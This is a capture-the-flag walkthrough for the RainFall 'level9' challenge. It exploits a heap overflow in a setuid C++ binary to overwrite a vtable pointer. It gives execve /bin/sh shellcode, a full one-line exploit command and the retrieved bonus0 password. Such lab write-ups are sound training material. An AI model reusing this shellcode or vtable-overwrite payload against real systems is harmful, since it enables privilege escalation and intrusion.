# 🔑 Level9 Walkthrough

## Step 1: Discovering the binary
When logged in as `level9`, you see:

```bash
level9@RainFall:~$ ls -l
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
```

- The binary runs with **bonus0’s privileges** (setuid).  
- Running it with or without arguments seems to do nothing visible:

```bash
./level9
./level9 bla
./level9 bla bla
```

So the interesting behavior is hidden.

---

## Step 2: Looking at the source
From `source.cpp`:

```cpp
class N {
public:
    char buff[104];
    int val;

    N(int val) {
        *(void ***)(this) = &(N::operator+);
        this->val = val;
    }

    void setAnnotation(char *buff) {
        memcpy(this->buff, buff, strlen(buff));
    }

    int operator+(N *param) { return this->val + param->val; }
    int operator-(N *param) { return this->val - param->val; }
};

int main(int ac, char **av) {
    if (ac <= 1) _exit(1);

    N *a = new N(5);
    N *b = new N(6);

    a->setAnnotation(av[1]);

    return ((int(*)(N *))b)(a);
}
```

Key points:
- Two objects of class `N` are created.  
- `setAnnotation()` copies user input into `buff` with **`memcpy()`** but without bounds checking → **buffer overflow**.  
- The constructor overwrites the vtable pointer with the address of `operator+`.  
- At the end, the program calls `b` as if it were a function pointer: `((int(*)(N *))b)(a)`.  
  - This dereferences into the vtable and calls whatever function pointer is stored there.  
- If we overflow `buff`, we can overwrite the vtable pointer and redirect execution.

---

## Step 3: Strategy
- Overflow `buff` (104 bytes) to overwrite the vtable pointer.  
- Replace it with the address of our shellcode (or with the address of `system`).  
- When the program calls through the vtable, it will jump to our payload.  

This is a **C++ object vtable overwrite exploit**.

---

## Step 4: Finding the offset
Using buffer overflow pattern generator in gdb, we find the crash occurs after **108 bytes**.  
So the layout is:

```
[104 bytes buffer] + [4 bytes val] → then overwrite vtable pointer
```

---

## Step 5: Crafting the payload
Two approaches:

### A. Direct ret2libc
- Overwrite the vtable pointer with the address of `system`.  
- Place `"/bin/sh"` in memory and point to it.  

### B. Inject shellcode
- Place shellcode in the buffer.  
- Overwrite the vtable pointer so that it points back into the buffer.  
- When dereferenced, execution jumps into our shellcode.  

Example shellcode (execve `/bin/sh`):

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68
\x68\x2f\x62\x69\x6e\x89\xe3\x89
\xc1\x89\xc2\xb0\x0b\xcd\x80\x31
\xc0\x40\xcd\x80
```

Payload structure:

```
[shellcode start address] +
[shellcode bytes] +
[padding up to 108 bytes] +
[address pointing back into buffer]
```

---

## Step 6: Exploiting
Example:

```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08"')
```

- `0x0804a010` → start of shellcode.  
- `0x0804a00c` → pointer to buffer, used to redirect execution.  

---

## Step 7: Result
Running the payload:

```
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

We now have the password for **bonus0**.

---

# ✅ Summary
- Vulnerability: **buffer overflow in C++ object** (`memcpy` into `buff`).  
- Goal: overwrite vtable pointer to redirect execution.  
- Offset: **108 bytes**.  
- Exploit: inject shellcode into buffer, overwrite vtable pointer to point to it.  
- Result: shell as **bonus0**, password retrieved.  
